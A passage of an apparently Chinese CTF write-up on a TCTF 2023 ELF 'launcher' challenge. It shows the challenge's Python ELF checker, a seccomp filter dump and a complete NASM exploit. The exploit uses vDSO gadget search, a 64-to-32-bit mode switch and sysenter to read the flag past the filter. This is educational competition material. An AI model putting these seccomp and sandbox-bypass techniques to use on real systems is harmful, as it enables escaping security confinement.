class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Answer!&#x27;</span>)<br>            exit()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid Input!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bytes</span>(<span class="hljs-params">data, b</span>):<br>    p = -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = data.find(b, p+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> p == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0xfff</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_segments</span>(<span class="hljs-params">elf</span>):<br>    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> elf.iter_segments():<br>        <span class="hljs-keyword">if</span> seg.header.p_filesz &gt; <span class="hljs-number">0x10000</span> <span class="hljs-keyword">or</span> seg.header.p_memsz &gt; <span class="hljs-number">0x10000</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Segment too large&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_INTERP&#x27;</span> <span class="hljs-keyword">or</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_DYNAMIC&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No dynamic link&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_LOAD&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_W <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;W^X&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_GNU_STACK&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No executable stack&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_elf</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x40</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data.startswith(<span class="hljs-string">b&#x27;\x7fELF\x02\x01\x01&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid ELF Magic&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\xcd\x80&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;\x0f\x05&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\xcd&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x80&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x0f&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x05&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    elf = ELFFile(BytesIO(data))<br>    <span class="hljs-keyword">if</span> ((elf.header.e_type != <span class="hljs-string">&#x27;ET_EXEC&#x27;</span> <span class="hljs-keyword">and</span> elf.header.e_type != <span class="hljs-string">&#x27;ET_DYN&#x27;</span>)<br>        <span class="hljs-keyword">or</span> elf.header.e_version != <span class="hljs-string">&#x27;EV_CURRENT&#x27;</span><br>        <span class="hljs-keyword">or</span> elf.header.e_ehsize != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phoff != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &lt;= <span class="hljs-number">0</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &gt;= <span class="hljs-number">100</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> check_segments(elf)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        size = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Size of your ELF: &#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> size &gt; <span class="hljs-number">0x10000</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF File:&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = sys.stdin.buffer.read(size)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) != size:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Received: %d bytes&#x27;</span> % <span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">if</span> check_elf(data):<br>        filename = sha3_256(data).hexdigest()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;File Hash: <span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>)<br>        path = <span class="hljs-string">f&#x27;./data/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span><br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            os.unlink(path)<br>        <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br>        os.chmod(path, <span class="hljs-number">0o555</span>)<br>        <span class="hljs-keyword">try</span>:<br>            p = subprocess.Popen([<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--rm&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;path&#125;</span>:/chroot/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;tctf/launcher64:2023&#x27;</span>, filename], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)<br>            p.wait()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return status: %d&#x27;</span> % p.returncode)<br>            <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">137</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Output:&#x27;</span>)<br>                sys.stdout.buffer.write(p.stdout.read())<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something went wrong!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> proof_of_work():<br>        main()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bye!&#x27;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>不同：</p>
+<ul>
+<li>禁止段表项数大于100</li>
+<li>禁止GNU_STACK段有x权限</li>
+</ul>
+<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1b</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0029</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x22</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == close) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1f</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000b</span>  <span class="hljs-keyword">if</span> (A == munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1e</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1d</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003c</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1c</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00000009</span>  <span class="hljs-keyword">if</span> (A != mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0015</span><br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000024</span>  A = prot &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0012</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0013</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000020</span>  A = prot <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x17</span> <span class="hljs-number">0x18</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x2</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0015</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0020</span><br> <span class="hljs-number">0016</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0017</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x00007fff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x7fff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0018</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0019</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x13</span> <span class="hljs-number">0xffffefe5</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0xffffefe5</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0021</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0022</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x10</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0023</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0024</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0e</span> <span class="hljs-number">0x00031337</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x31337</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0025</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000001c</span>  A = flags &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0026</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0027</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000018</span>  A = flags <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0028</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x0a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0029</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0030</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0031</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0032</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0033</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0034</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000002d</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0035</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005a</span>  <span class="hljs-keyword">if</span> (A == mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0036</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005b</span>  <span class="hljs-keyword">if</span> (A == munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0037</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A != exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0038</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br> <span class="hljs-number">0039</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>64位<ul>
+<li>mmap只写段</li>
+<li>open &amp;filename &#x3D;&#x3D; 0x31337</li>
+</ul>
+</li>
+<li>32位：read，write，mmap</li>
+</ul>
+<h3 id="sysenter-1"><a href="#sysenter-1" class="headerlink" title="sysenter"></a>sysenter</h3><p>顺着exp捋一遍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; compile with: nasm -f elf64 exp.s -o exp.o &amp;&amp; ld exp.o -e _start -o exp -T linker.ld<br><br>global      _start<br>section     .text exec<br>BITS 32<br><br>    ; align 0x1000<br>vdso_landing:<br>; sysenter will use sysexit to return to some place in vsdo<br>; because is in 32bit, high 32bit will be clear<br>; we setup a soft landing place at the start of elf<br>; then mmap elf to vdso address<br>    times 4096 db 0x90      ; nop padding<br>    pop     ebp<br>    pop     edx<br>    pop     ecx<br>    ret<br><br>    ; lea     esp, [stack]<br>    ; mov     esp, stack<br><br>retf_to_64:<br>    push    0x33            ; cs<br>    push    edi             ; ip<br>    retf                    ; jump to edi (64bit)<br><br>_sysenter:<br>    push    ecx             ; push   ecx<br>    push    edx             ; push   edx<br>    push    ebp             ; push   ebp<br>    mov     ebp, esp<br>    sysenter<br><br>start_32:<br>mmap_elf_to_vdso:<br>    push    0x1000          ; off: 0x1000 : .text start<br>    push    4               ; fd: 4, elf file<br>    push    0x11            ; flags: MAP_FIXED | MAP_SHARED<br>    push    5               ; prot: RX<br>    push    0x4000          ; length: elf size<br>    push    edx             ; addr: vdso return addr &amp;&amp; elf base<br>    mov     ebx, esp<br>    mov     eax, 0x5a       ; mmap<br>    call    _sysenter<br>read_flag:<br>    mov     eax, 3          ; SYS_read (32bit)<br>    mov     ebx, 3          ; fd: flag<br>    mov     ecx, 0x31337    ; buf<br>    mov     edx, 0x1000     ; count<br>    call    _sysenter<br>write_flag_to_stdout:<br>	mov     edx, eax        ; count<br>    mov     eax, 4          ; SYS_write (32bit)<br>    mov     ebx, 1          ; fd: STDOUT<br>    mov     ecx, 0x31337    ; buf<br>    call    _sysenter<br>exit_137:<br>    mov     eax, 1          ; SYS_exit (32bit)<br>    mov     ebx, 137        ; error_code<br>    call    _sysenter<br><br>BITS 64<br><br>; copy string at rsi to rdi, no return value<br>strcpy:<br>    cld<br>cpy1:<br>    lodsb<br>    stosb<br>    test al,al<br>    jne cpy1<br>    ret<br><br>retf_to_32:<br>; switch to 32 bit<br>    push    0x23            ; cs<br>    push    rdi             ; ip<br>    retfq                   ; jump to rdi<br><br>_start:<br>find_elf_name:<br>    mov     r13, [rsp+8] ; argv[0]<br><br>; find vdso address on stack<br>    mov rdi, rsp<br>find_vdso_l1:<br>    cmp     QWORD [rdi],0x21<br>    je      find_vdso_l2<br>    add     rdi,0x8<br>    jmp     find_vdso_l1<br>find_vdso_l2: <br>    mov     r15, QWORD [rdi+0x8] ; r15 store vdso address, will be page aligned<br>    mov     rax, r15<br>; search for `syscall; ret` in vdso<br>find_syscall_ret_l1:<br>    cmp    BYTE [rax],0xf<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x1],0x5<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x2],0x31<br>    je     find_syscall_ret_l3<br>find_syscall_ret_l2:<br>    inc    rax<br>    jmp    find_syscall_ret_l1<br>find_syscall_ret_l3:<br>    mov     r14, rax            ; r14: syscall; ret<br><br><br>open_flag:<br>    mov     edi, 0x31337    ; ld script will ensure 0x31337 is mapped and RW<br>    lea     rsi, [flag]<br>    call    strcpy<br>    <br>    mov     edi, 0x31337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;flag&quot;, 0) -&gt; fd 3<br><br>open_elf:<br>    mov     edi, 0x31337    ; ld script will ensure 0x31337 is mapped and RW<br>    mov     rsi, r13<br>    call    strcpy<br>    <br>    mov     edi, 0x31337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;ELF_FILE&quot;, 0) -&gt; fd 4<br>; enter 32 bit<br>    mov     edx, r15d ; clear high 32 bit vdso addr<br>    mov     rsp, stack<br>    mov     rdi, start_32<br>    call    retf_to_32<br><br>flag:       db          &quot;flag&quot;, 0<br>message:    db          &quot;test output!!!!!&quot;, 0<br>sc:         db          0x90, 0x90<br>sc_len:     dq          2<br>section     .bss noexec<br>    align 16<br>pad:        resb        0x1000<br>stack:      resb        0x1000<br></code></pre></td></tr></table></figure>
+
+<p>跳来跳去的很乱，按标签标记</p>
